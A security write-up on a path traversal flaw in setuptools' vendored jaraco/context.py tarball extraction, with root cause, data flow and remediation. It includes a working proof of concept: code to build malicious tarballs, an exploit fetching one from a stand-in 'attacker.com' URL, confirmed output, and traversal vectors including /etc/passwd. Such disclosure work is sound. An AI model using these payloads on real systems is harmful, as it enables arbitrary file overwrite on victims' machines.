# Deep Dive: Tarball Path Traversal via strip_first_component Filter Bypass

## Executive Summary

This document provides a comprehensive technical analysis of a path traversal vulnerability in setuptools' vendored `jaraco/context.py` module. The vulnerability allows an attacker to write files to arbitrary locations by exploiting a custom tarfile extraction filter that bypasses Python's built-in security mechanisms.

**This is a DISTINCT vulnerability from the package_index.py and wheel.py issues.**

---

## Vulnerability Overview

| Field | Value |
|-------|-------|
| **Component** | `setuptools/_vendor/jaraco/context.py` |
| **Vulnerable Function** | `tarball()` with `strip_first_component` filter |
| **Lines** | 64-65, 71-76 |
| **CWE Classification** | CWE-22 (Path Traversal) |
| **Attack Vector** | Malicious tarball served from URL |
| **Impact** | Arbitrary file write with attacker-controlled content |
| **Tested Version** | setuptools 78.1.0 |

### Root Cause Summary

The vulnerability exists because:

1. Python 3.12+ and the backported `tarfile` module include security filters (PEP 706)
2. The `strip_first_component` custom filter modifies `member.name` directly
3. Custom callable filters **replace** rather than **chain with** security filters
4. The modified name can become an absolute path or contain traversal sequences
5. No validation is performed after the filter modifies the path

---

## Affected Code Analysis

### Function: `tarball()` (Lines 40-68)

```python
@contextlib.contextmanager
def tarball(url, target_dir=None):
    if target_dir is None:
        target_dir = os.path.basename(url).replace('.tar.gz', '').replace('.tgz', '')
    os.mkdir(target_dir)
    try:
        req = urllib.request.urlopen(url)
        with tarfile.open(fileobj=req, mode='r|*') as tf:
            tf.extractall(path=target_dir, filter=strip_first_component)  # VULNERABLE
        yield target_dir
    finally:
        shutil.rmtree(target_dir)
```

### Function: `strip_first_component()` (Lines 71-76)

```python
def strip_first_component(
    member: tarfile.TarInfo,
    path,
) -> tarfile.TarInfo:
    _, member.name = member.name.split('/', 1)  # VULNERABLE: No validation after split
    return member
```

### The Security Filter Bypass

When `tf.extractall(filter=strip_first_component)` is called:

1. `_get_filter_function()` checks if `filter` is callable (line 2266-2267)
2. Since `strip_first_component` is callable, it's used **directly**
3. The built-in security filters (`data_filter`, `tar_filter`) are **never invoked**
4. `strip_first_component` modifies the path without any security validation

---

## The Vulnerability Mechanics

### How Tarfile Security Filters Work (PEP 706)

Python 3.12+ and the backported tarfile include security filters:

```python
def data_filter(member, dest_path):
    """Safe filter that validates paths."""
    # 1. Strip leading slashes
    if name.startswith(('/', os.sep)):
        name = member.path.lstrip('/' + os.sep)

    # 2. Check for absolute paths
    if os.path.isabs(name):
        raise AbsolutePathError(member)

    # 3. Verify path stays in destination
    target_path = os.path.realpath(os.path.join(dest_path, name))
    if os.path.commonpath([target_path, dest_path]) != dest_path:
        raise OutsideDestinationError(member, target_path)

    return member
```

### How strip_first_component Bypasses Security

The `strip_first_component` filter:

1. Splits the member name on the first `/`
2. Assigns the remainder to `member.name`
3. Returns the modified member
4. **Does NOT perform any security validation**

```python
def strip_first_component(member, path):
    _, member.name = member.name.split('/', 1)
    return member

# Example: "prefix//tmp/evil.txt"
# After split('/', 1): ('prefix', '/tmp/evil.txt')
# member.name becomes: '/tmp/evil.txt' (ABSOLUTE PATH!)
```

---

## Attack Vectors

### Vector 1: Absolute Path via Double Slash

```
Tarball entry: prefix//tmp/pwned/evil.txt
                     ^^
                     Double slash

split('/', 1) → ('prefix', '/tmp/pwned/evil.txt')
member.name   → '/tmp/pwned/evil.txt'

Result: File extracted to /tmp/pwned/evil.txt (absolute path!)
```

### Vector 2: Path Traversal via Dot-Dot

```
Tarball entry: prefix/../../../tmp/pwned/evil.txt

split('/', 1) → ('prefix', '../../../tmp/pwned/evil.txt')
member.name   → '../../../tmp/pwned/evil.txt'

Result: File extracted to /tmp/pwned/evil.txt (relative traversal)
```

### Vector 3: Mixed Traversal

```
Tarball entry: prefix/foo/../../etc/passwd

split('/', 1) → ('prefix', 'foo/../../etc/passwd')
member.name   → 'foo/../../etc/passwd'

Result: Escapes to /etc/passwd if extraction starts deep enough
```

---

## Complete Data Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACKER-CONTROLLED                                │
│                                                                              │
│  Tarball served from malicious URL                                          │
│  Entry: prefix//tmp/pwned/evil.txt                                          │
│  Content: Attacker's payload                                                │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  jaraco/context.py:63-65 - tarball()                                        │
│                                                                              │
│     req = urllib.request.urlopen(url)                                       │
│     with tarfile.open(fileobj=req, mode='r|*') as tf:                       │
│         tf.extractall(path=target_dir, filter=strip_first_component)        │
│                                              ▲                               │
│                                              │                               │
│                              Custom callable filter replaces                 │
│                              built-in security filters!                      │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  backports/tarfile/__init__.py:2289 - extractall()                          │
│                                                                              │
│     filter_function = self._get_filter_function(filter)                     │
│                       ▲                                                      │
│                       │ Returns strip_first_component directly               │
│                       │ because it's callable (line 2266-2267)               │
│                                                                              │
│     for member in members:                                                  │
│         tarinfo = self._get_extract_tarinfo(member, filter_function, path)  │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  backports/tarfile/__init__.py:2346 - _get_extract_tarinfo()                │
│                                                                              │
│     tarinfo = filter_function(tarinfo, path)                                │
│               ▲                                                              │
│               │ Calls strip_first_component(member, target_dir)             │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  jaraco/context.py:71-76 - strip_first_component() [VULNERABLE]             │
│                                                                              │
│     _, member.name = member.name.split('/', 1)                              │
│                      ▲                                                       │
│                      │ "prefix//tmp/pwned/evil.txt".split('/', 1)           │
│                      │  = ('prefix', '/tmp/pwned/evil.txt')                 │
│                      │                                                       │
│                      │ member.name = '/tmp/pwned/evil.txt'                  │
│                                                                              │
│     return member  ← No validation! Absolute path passes through            │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  backports/tarfile/__init__.py:2302 - extractall() continues                │
│                                                                              │
│     self._extract_one(tarinfo, path, ...)                                   │
│                       ▲                                                      │
│                       │ tarinfo.name = '/tmp/pwned/evil.txt'                │
│                       │ path = '/some/target/dir'                           │
│                       │                                                      │
│                       │ Extraction uses tarinfo.name which is absolute      │
│                       │ Target path becomes /tmp/pwned/evil.txt             │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  RESULT                                                                      │
│                                                                              │
│     File written: /tmp/pwned/evil.txt                                       │
│     Content: Attacker's payload                                             │
│     Expected location: /some/target/dir/tmp/pwned/evil.txt                  │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Proof of Concept

### Creating a Malicious Tarball

```python
import tarfile
import io

# Create tarball with double-slash entry
with tarfile.open("malicious.tar.gz", "w:gz") as tf:
    content = b"PWNED!\n"
    info = tarfile.TarInfo(name="prefix//tmp/pwned/evil.txt")
    info.size = len(content)
    tf.addfile(info, io.BytesIO(content))
```

### Exploitation

```python
from jaraco.context import tarball

# Attacker serves malicious.tar.gz at this URL
url = "http://attacker.com/malicious.tar.gz"

# Victim code expects files in /safe/target
with tarball(url, target_dir="/safe/target") as extracted:
    # File actually written to /tmp/pwned/evil.txt!
    pass
```

### Verified Output

```
======================================================================
Tarball Path Traversal PoC (jaraco/context.py)
======================================================================

[*] Before exploit:
    /tmp/pwned_by_tarball exists? False

[*] Tarball entry: prefix//tmp/pwned_by_tarball/evil.txt
[*] After strip_first_component: /tmp/pwned_by_tarball/evil.txt

[*] Calling tarball() with target_dir=/tmp/tmpXXXXXX/extracted
[*] Files should only be extracted under: /tmp/tmpXXXXXX/extracted

[*] After exploit:
    /tmp/pwned_by_tarball exists? True

[!] VULNERABILITY CONFIRMED!
    File written outside target directory!

[*] Contents of /tmp/pwned_by_tarball/evil.txt:
    'PWNED by tarball path traversal vulnerability!\n'
```

---

## Comparison with Other Vulnerabilities

| Aspect | package_index.py | wheel.py | jaraco/context.py (this) |
|--------|------------------|----------|--------------------------|
| **Location** | `_download_url()` | `_fix_namespace_packages()` | `tarball()` |
| **Source** | URL-encoded path | namespace_packages.txt | Tarball member names |
| **Trigger** | Package download | Wheel-to-egg install | Tarball extraction |
| **Content Control** | Full | Fixed string | Full |
| **Attack Vector** | Malicious index | Malicious wheel | Malicious tarball URL |
| **Severity** | Critical | High | High |

---

## Where tarball() Is Used

The `tarball()` function and `tarball_cwd` context manager can be used to:

1. Download and extract source distributions
2. Fetch dependencies from URLs
3. Bootstrap build environments

Any code that calls `tarball(url)` with an attacker-controlled URL is vulnerable.

---

## Remediation

### Option 1: Chain with data_filter

```python
def strip_first_component(member, path):
    _, member.name = member.name.split('/', 1)
    # Apply data_filter after our modification
    return data_filter(member, path)
```

### Option 2: Manual Validation

```python
def strip_first_component(member, path):
    _, member.name = member.name.split('/', 1)

    # Strip leading slashes
    member.name = member.name.lstrip('/' + os.sep)

    # Check for absolute paths (Windows drive letters)
    if os.path.isabs(member.name):
        return None  # Skip this entry

    # Verify path stays in destination
    target = os.path.realpath(os.path.join(path, member.name))
    dest = os.path.realpath(path)
    if not target.startswith(dest + os.sep):
        return None  # Skip this entry

    return member
```

### Option 3: Use Named Filter with Post-Processing

```python
def tarball(url, target_dir=None):
    # ... setup ...
    with tarfile.open(fileobj=req, mode='r|*') as tf:
        # Use safe extraction first
        tf.extractall(path=temp_dir, filter='data')

    # Then move files, stripping first component
    for item in os.listdir(temp_dir):
        first_component = os.path.join(temp_dir, item)
        if os.path.isdir(first_component):
            for sub in os.listdir(first_component):
                shutil.move(os.path.join(first_component, sub), target_dir)
```

---

## Files in This Directory

```
tarball_vuln/
├── TARBALL.md                   # This document
├── build_malicious_tarball.py   # Script to create malicious tarballs
├── exploit_test.py              # Script to trigger and verify vulnerability
├── malicious_absolute.tar.gz    # Pre-built PoC (absolute path attack)
└── malicious_traversal.tar.gz   # Pre-built PoC (path traversal attack)
```

---

## Running the PoC

```bash
# Clean up any previous test
rm -rf /tmp/pwned_by_tarball

# Build the malicious tarballs
python3 build_malicious_tarball.py

# Run the exploit
python3 exploit_test.py

# Verify the result
ls -la /tmp/pwned_by_tarball/
cat /tmp/pwned_by_tarball/evil.txt
```

---

## Key Takeaways

1. **Custom filters bypass security**: When using `tarfile.extractall(filter=callable)`, the callable **replaces** built-in security filters
2. **Filter chaining required**: Custom filters must explicitly chain with `data_filter` or implement equivalent checks
3. **Double-slash creates absolute paths**: `"prefix//path".split('/', 1)` returns `('prefix', '/path')`
4. **Defense in depth**: Always validate paths after any transformation, not just at input

---

## References

- [PEP 706 - Filter for tarfile.extractall](https://peps.python.org/pep-0706/)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Python tarfile security](https://docs.python.org/3/library/tarfile.html#tarfile-extraction-filter)
- [Zip Slip vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
